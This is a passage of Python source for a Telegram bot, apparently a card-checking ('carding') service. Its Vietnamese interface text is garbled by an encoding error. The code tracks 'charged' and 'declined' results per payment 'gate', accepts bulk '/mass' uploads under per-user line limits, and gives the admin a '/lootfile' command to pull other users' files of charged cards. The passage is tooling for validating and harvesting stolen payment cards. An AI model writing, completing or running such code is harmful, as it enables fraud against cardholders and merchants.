                    message += (f"  á… **Gate {i}:**\n"
                                f"    âœ… Charged: `{data.get('total_charged', 0)}` | âŒ Declined: `{data.get('total_decline', 0)}`\n"
                                f"    ğŸ”’ Custom: `{data.get('total_custom', 0)}` | â” Lá»—i: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                                f"    ğŸ•’ Láº§n cuá»‘i: `{data.get('last_check_timestamp', 'N/A')}`\n")
            if not has_data:
                message += "  *ChÆ°a tá»«ng check.*\n"
        message += "--------------------\n"
        
    await update.message.reply_text(message)


async def loot_file_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("CÃº phÃ¡p: `/lootfile <user_id>`")
        return
    target_user_id = context.args[0]
    keyboard = [
        [InlineKeyboardButton("Lá»‹ch sá»­ Gate 1", callback_data=f"loot_mainmenu_gate1_{target_user_id}")],
        [InlineKeyboardButton("Lá»‹ch sá»­ Gate 2", callback_data=f"loot_mainmenu_gate2_{target_user_id}")],
    ]
    await update.message.reply_text(f"Chá»n cá»•ng Ä‘á»ƒ xem lá»‹ch sá»­ cá»§a user `{target_user_id}`:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')
    command = data[0]
    
    if command == "loot":
        action = data[1]
        gate_num = re.search(r'gate(\d+)', data[2]).group(1)
        target_user_id = data[3]
        
        session_ts = data[4] if len(data) > 4 else None
        filename = data[5] if len(data) > 5 else None

        user_log_dir = os.path.join(LOG_DIR, f"gate_{gate_num}", target_user_id)

        if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
            await query.edit_message_text(f"KhÃ´ng tÃ¬m tháº¥y lá»‹ch sá»­ Gate {gate_num} cho user `{target_user_id}`.")
            return

        if action == "mainmenu":
            keyboard = [[InlineKeyboardButton("1. Láº¥y File Charge Gáº§n Nháº¥t", callback_data=f"loot_latestcharge_gate{gate_num}_{target_user_id}")],
                        [InlineKeyboardButton("2. Láº¥y Táº¥t Cáº£ File Charge", callback_data=f"loot_allcharge_gate{gate_num}_{target_user_id}")],
                        [InlineKeyboardButton("3. Chá»n Tá»« Lá»‹ch Sá»­", callback_data=f"loot_history_gate{gate_num}_{target_user_id}")]]
            await query.edit_message_text(f"Chá»n tÃ¹y chá»n cho **Gate {gate_num}** cá»§a user `{target_user_id}`:", reply_markup=InlineKeyboardMarkup(keyboard))
        
        elif action == "latestcharge":
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            if os.path.exists(file_path):
                await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
                await query.edit_message_text(f"âœ… ÄÃ£ gá»­i file charge gáº§n nháº¥t tá»« Gate {gate_num}, session `{latest_session}`.")
            else:
                await query.edit_message_text(f"â„¹ï¸ Láº§n check gáº§n nháº¥t (`{latest_session}`) trÃªn Gate {gate_num} khÃ´ng cÃ³ tháº» charge nÃ o.")

        elif action == "allcharge":
            all_charged_content = []
            for session in sorted(os.listdir(user_log_dir)):
                file_path = os.path.join(user_log_dir, session, "charged.txt")
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        all_charged_content.append(f.read())
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                file_to_send = io.BytesIO(combined_content.encode('utf-8'))
                await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=f"gate{gate_num}_all_charged_{target_user_id}.txt")
                await query.edit_message_text(f"âœ… ÄÃ£ gá»­i file tá»•ng há»£p táº¥t cáº£ tháº» charge tá»« Gate {gate_num} cá»§a user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"â„¹ï¸ User `{target_user_id}` khÃ´ng cÃ³ tháº» charge nÃ o trÃªn Gate {gate_num}.")

        elif action == "history":
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for ts in sessions:
                summary_path = os.path.join(user_log_dir, ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path, {})
                    counts = summary.get('counts', {})
                    try: readable_ts = datetime.strptime(ts, "%Y%m%d-%H%M%S").strftime("%d/%m/%y %H:%M")
                    except ValueError: readable_ts = ts
                    btn_text = f"ğŸ•’ {readable_ts} - âœ…{counts.get('success',0)} âŒ{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"loot_session_gate{gate_num}_{target_user_id}_{ts}")])
            keyboard.append([InlineKeyboardButton("Â« Quay láº¡i Menu ChÃ­nh", callback_data=f"loot_mainmenu_gate{gate_num}_{target_user_id}")])
            await query.edit_message_text(f"ğŸ“œ Lá»‹ch sá»­ check **Gate {gate_num}** cá»§a user `{target_user_id}`:", reply_markup=InlineKeyboardMarkup(keyboard))
        
        elif action == "session":
            files = [f for f in os.listdir(os.path.join(user_log_dir, session_ts)) if f.endswith('.txt')]
            keyboard = [[InlineKeyboardButton(f"Táº£i {f}", callback_data=f"loot_getfile_gate{gate_num}_{target_user_id}_{session_ts}_{f}")] for f in files]
            keyboard.append([InlineKeyboardButton("Â« Quay láº¡i Lá»‹ch Sá»­", callback_data=f"loot_history_gate{gate_num}_{target_user_id}")])
            await query.edit_message_text(f"Chá»n file Ä‘á»ƒ táº£i tá»« session `{session_ts}`:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif action == "getfile":
            file_path = os.path.join(user_log_dir, session_ts, filename)
            if os.path.exists(file_path):
                await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
                await query.answer(f"ÄÃ£ gá»­i file {filename}")
            else:
                await query.answer("âŒ Lá»—i: KhÃ´ng tÃ¬m tháº¥y file.", show_alert=True)

async def add_user(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("CÃº phÃ¡p: `/add <user_id>`")
        return
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"â„¹ï¸ User `{user_to_add}` Ä‘Ã£ cÃ³ trong danh sÃ¡ch.")
        else:
            users.add(user_to_add)
            save_users(users)
            await update.message.reply_text(f"âœ… ÄÃ£ thÃªm user `{user_to_add}`.")
    except ValueError:
        await update.message.reply_text("âŒ User ID khÃ´ng há»£p lá»‡.")

async def ban_user(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("CÃº phÃ¡p: `/ban <user_id>`")
        return
    try:
        user_to_ban = int(context.args[0])
        users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban)
            save_users(users)
            # Remove logs from both gates
            for gate_num in [1, 2]:
                user_log_dir = os.path.join(LOG_DIR, f"gate_{gate_num}", str(user_to_ban))
                if os.path.exists(user_log_dir):
                    shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"ğŸ—‘ ÄÃ£ xÃ³a user `{user_to_ban}` vÃ  toÃ n bá»™ log.")
        else:
            await update.message.reply_text(f"â„¹ï¸ KhÃ´ng tÃ¬m tháº¥y user `{user_to_ban}`.")
    except ValueError:
        await update.message.reply_text("âŒ User ID khÃ´ng há»£p lá»‡.")

async def show_users(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("ğŸ“­ Danh sÃ¡ch ngÆ°á»i dÃ¹ng trá»‘ng.")
        return
    message_lines = ["ğŸ‘¥ **Danh sÃ¡ch ID & Háº¡n má»©c:**\n"]
    for user_id in sorted(list(users)):
        limit = get_user_limit(user_id)
        message_lines.append(f"- `{user_id}` | Háº¡n má»©c: `{limit}` lines")
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("CÃº phÃ¡p: `/addlimit <user_id> <sá»‘_dÃ²ng_thÃªm>`")
        return
    try:
        target_user_id_str, amount_to_add = context.args[0], int(context.args[1])
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError("Dá»¯ liá»‡u khÃ´ng há»£p lá»‡.")
    except (ValueError, IndexError):
        await update.message.reply_text("âŒ Dá»¯ liá»‡u khÃ´ng há»£p lá»‡.")
        return
    
    limits = load_json_file(LIMIT_FILE, {})
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    await update.message.reply_text(f"âœ… **Cáº­p nháº­t giá»›i háº¡n thÃ nh cÃ´ng!**\n\nğŸ‘¤ **User ID:** `{target_user_id_str}`\nğŸ“ˆ **Giá»›i háº¡n cÅ©:** `{old_limit}`\nâ• **ÄÃ£ thÃªm:** `{amount_to_add}`\nğŸ“Š **Tá»•ng má»›i:** `{new_limit}`")

def main():
    """Start the bot."""
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # Lá»‡nh Admin
    application.add_handler(CommandHandler("on", on_command))
    application.add_handler(CommandHandler("off", off_command))
    application.add_handler(CommandHandler("rs", reset_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    
    # Lá»‡nh User
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Khá»Ÿi táº¡o file cáº¥u hÃ¬nh náº¿u chÆ°a cÃ³
    load_config()
    
    logger.info(f"Bot Ä‘ang cháº¡y vá»›i Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
